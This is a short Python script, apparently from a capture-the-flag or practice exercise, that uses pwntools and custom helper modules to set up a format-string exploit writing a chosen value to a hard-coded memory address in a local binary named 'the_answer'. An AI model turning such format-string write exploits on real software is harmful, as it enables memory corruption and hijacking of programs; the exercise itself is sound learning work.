import FormatStringGenerator
import Exploit

from pwn import *


target = "/home/gabriele/the_answer"

exploit = Exploit.Exploit(target=target, value=0xffff00ff00ff0000, target_address=0x555555755018)
